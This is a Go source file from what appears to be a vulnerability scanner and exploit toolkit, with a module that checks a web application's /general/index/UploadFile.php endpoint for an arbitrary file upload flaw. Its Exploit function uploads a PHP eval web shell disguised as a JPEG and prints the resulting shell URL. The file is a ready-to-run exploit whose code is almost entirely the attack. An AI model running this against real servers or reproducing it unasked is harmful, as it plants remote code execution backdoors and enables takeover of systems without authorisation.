package vulners

import (
	"bytes"
	"github.com/fatih/color"
	"github.com/imroc/req/v3"
	"io"
	"regexp"
	"strings"
)

type Wo07 struct {
}

func (s *Wo07) Scan(targetUrl string) {
	vulnerable, err := Wo07scancore(targetUrl)
	if err != nil {
		color.Red("[x]请求异常！")
		return
	}
	if vulnerable {
		color.Green("[Wo07] 存在UploadFile[1] 任意文件上传")
	} else {
		color.White("[Wo07] 不存在UploadFile[1] 任意文件上传")
	}
}

func (*Wo07) Exploit(targetUrl string) {
	runResult, err := Wo07runcore(targetUrl)
	if err != nil {
		color.Red("[x]漏洞利用异常！")
		return
	}
	if runResult != "" {
		color.Green(runResult)
	} else {
		color.White("[!]漏洞利用无返回结果")
	}
}

func Wo07scancore(targetUrl string) (bool, error) {
	url := "/general/index/UploadFile.php?m=uploadPicture&uploadType=theme&userId=1"
	data := []byte("helloword")
	resp, err := baseClient.NewRequest().SetFileUpload(req.FileUpload{
		ParamName: "Filedata",
		FileName:  "1ndex.png",
		GetFileContent: func() (io.ReadCloser, error) {
			return io.NopCloser(bytes.NewBuffer(data)), nil
		},
		FileSize:    int64(len(data)),
		ContentType: "image/jpeg",
	}).Post(targetUrl + url)
	if err != nil {
		return false, err
	}
	resContent := resp.String()
	if strings.Contains(resContent, "name") {
		return true, nil
	} else {
		return false, nil
	}
}

func Wo07runcore(targetUrl string) (string, error) {
	url := "/general/index/UploadFile.php?m=uploadPicture&uploadType=theme&userId=1"
	data := []byte("<?php @eval($_GET['pass']);?>")
	resp, err := baseClient.NewRequest().SetFileUpload(req.FileUpload{
		ParamName: "Filedata",
		FileName:  "1ndex.php",
		GetFileContent: func() (io.ReadCloser, error) {
			return io.NopCloser(bytes.NewBuffer(data)), nil
		},
		FileSize:    int64(len(data)),
		ContentType: "image/jpeg",
	}).Post(targetUrl + url)
	if err != nil {
		return "", err
	}
	resContent := resp.String()
	r, err := regexp.Compile("name\":\"([\\s\\S]*?)\",")
	if err != nil {
		return "", nil
	}
	result := strings.Replace(r.FindString(resContent), "name\":\"", "", -1)
	result = strings.Replace(result, "\",", "", -1)
	if strings.Contains(resContent, "name") {
		return "存在UploadFile[1] 任意文件上传 webshell地址:\n" + targetUrl + "/images/themes/" + result, nil
	} else {
		return "", nil
	}
}
